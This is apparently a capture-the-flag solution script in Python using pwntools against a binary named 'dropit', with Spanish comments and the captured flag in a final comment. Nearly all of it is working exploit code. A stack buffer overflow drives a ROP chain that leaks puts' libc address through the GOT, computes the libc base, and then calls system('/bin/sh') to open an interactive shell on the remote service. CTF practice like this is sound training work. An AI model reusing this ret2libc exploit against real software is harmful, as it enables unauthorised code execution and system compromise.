#!/usr/bin/python3
from pwn import *
context.log_level='debug'

elf = context.binary = ELF("dropit")
# libc = ELF("./libc6_2.31-3_amd64.so") #para remoto
libc = ELF("./libc6_2.32-0ubuntu3_amd64.so") #para local

gs = '''
continue
'''
# def start():
#     if args.GDB:
#         return gdb.debug(elf.path, gdbscript=gs)
#     else:
#         return process(elf.path)
def start():
    return remote("challenges.ctfd.io","30261")

pop_rdi = 0x0000000000401203
pop_rsi = 0x0000000000401201
io = start()
pay =  b'A'*56
pay += p64(pop_rdi)
pay += p64(elf.got['puts'])
pay += p64(elf.plt['puts'])
pay += p64(elf.symbols['main'])
# for i in elf.got:
#     print (i)
io.sendline(pay)
io.recvline()
leak=io.recvline()[0:6]
libc_puts=u64(leak.ljust(8,b'\x00'))
libc_base=libc_puts-libc.symbols["puts"]
print("libc_puts: ",hex(libc_puts))
print("libc_base: ",hex(libc_base))
pay2 =  b'B'*56
pay2 += p64(pop_rdi + 1)
pay2 += p64(pop_rdi)
pay2 += p64(libc_base + next(libc.search(b'/bin/sh')))
pay2 += p64(libc_base + libc.symbols['system'])
io.sendline(pay2)
io.interactive()
# =============================================================================

# nactf{r0p_y0ur_w4y_t0_v1ct0ry_698jB84iO4OH1cUe}